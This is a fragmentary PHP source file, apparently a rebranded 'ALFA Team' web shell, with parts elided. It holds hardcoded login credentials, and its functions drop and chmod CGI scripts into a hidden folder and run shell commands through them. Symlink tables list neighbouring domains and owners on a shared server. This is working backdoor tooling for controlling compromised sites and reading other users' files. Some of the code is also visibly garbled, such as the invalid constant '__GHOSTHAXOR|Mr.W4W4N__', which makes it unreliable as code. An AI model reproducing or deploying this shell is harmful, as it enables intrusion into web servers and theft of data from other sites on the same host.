...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'admingantemg',
    'password' => '482ddd19cb84d650161476c68129bc51',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
define("__ALFA_DATA_COK__", "ALFA_DATA");
...
<center><img style="border-radius:100px;" width="500" height="250" alt="alfa team 2012" draggable="false" src="https://upload.wikimedia.org/wikipedia/id/thumb/d/d8/Lambang_Partai_Demokrasi_Indonesia_Perjuangan.svg/1200px-Lambang_Partai_Demokrasi_Indonesia_Perjuangan.svg.png" /></center>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["ghosthaxornikung_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["ghosthaxorapi"])){
			if(!@file_exists("ghosthaxornikung/".$_COOKIE["ghosthaxorapi"].".alfa")){
				$recreate = true;
				$lang = $_COOKIE["ghosthaxorapi"];
			}
		}
		if(!isset($_COOKIE["ghosthaxorapi"])||$recreate){
			...
			alfacgihtaccess('cgi', "ghosthaxornikung/");
		}else{
			$lang = $_COOKIE["ghosthaxorapi"];
		}
		$cgi_ext = ".alfa";
		...
		$cgi_url = __ALFA_DATA_COK__."/ghosthaxornikung/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("ghosthaxorapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("ghosthaxornikung_mode", "off");
			}
		}
		return trim($out);
	}else{
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="alfa team 2012" draggable="false" src="https://upload.wikimedia.org/wikipedia/id/thumb/d/d8/Lambang_Partai_Demokrasi_Indonesia_Perjuangan.svg/1200px-Lambang_Partai_Demokrasi_Indonesia_Perjuangan.svg.png" /></td>
</tr>
<tr>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["ghosthaxornikung_mode"])&&!isset($_COOKIE["ghosthaxorapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	if(in_array($name, $not_api)){
		...
		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_COK__);
	}
	@mkdir('ghosthaxornikung',0755);
	__write_file("ghosthaxornikung/".$name, __get_resource($source));
	@chmod("ghosthaxornikung/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/ghosthaxornikung';sh getheader.alfa",false,true,true);
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/ghosthaxornikung/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/ghosthaxornikung;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
function alfaCreateParentFolder(){
	$parent = $GLOBALS['home_cwd'] . "/" . __GHOSTHAXOR|Mr.W4W4N__;
	if(!@is_dir($parent)){
...
AlfaNum(9,10);
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __GHOSTHAXOR|Mr.W4W4N__);
...
echo __pre();
echo '<center><b><font color="white">Click >> </font><a target="_blank" href="'.__GHOSTHAXOR|Mr.W4W4N__."/".$sym_dir.'" ><b><font size="4">'.$symname.'</font></b></a></b></center>';
}
...
echo $table_header;
$count=1;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="{http}"/><span style="color:#00A220;margin-left:10px;"><b>{domain}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{owner}</font></b></td><td><a href="'.__GHOSTHAXOR|Mr.W4W4N__.'/alfasymlink/root{sympath}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
...
$count=1;
echo $table_header;
$template = '<tr><td><span style="color:#FFFF01;">{count}</span></td><td style="text-align:left;"><a target="_blank" href="http://www.{url}"/><span style="color:#00A220;margin-left:10px;"><b>{url}</b> </a></span></td><td style="text-align:left;"><span style="color:#FFFFFF;margin-left:10px;"><b>{user}</font></b></td><td><a href="'.__GHOSTHAXOR|Mr.W4W4N__.'/alfasymlink/root{cwd}" target="_blank"><span style="color:#FF0000;">Symlink</span></a></td></tr>';
if($sole){
...
@chmod($name,0755);
echo '<iframe src="'.__GHOSTHAXOR|Mr.W4W4N__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
$bash_users  = alfaEx("cd ".$tmp_path."/ghosthaxornikung;sh basedir.alfa ".$makepwd,false,true,true);
...
return('<iframe src="'.__GHOSTHAXOR|Mr.W4W4N__."/".$f.'" width="'.$width.'" height="'.$height.'" frameborder="0"></iframe>');
}
class AlfaCURL {
public $headers;
public $user_agent;
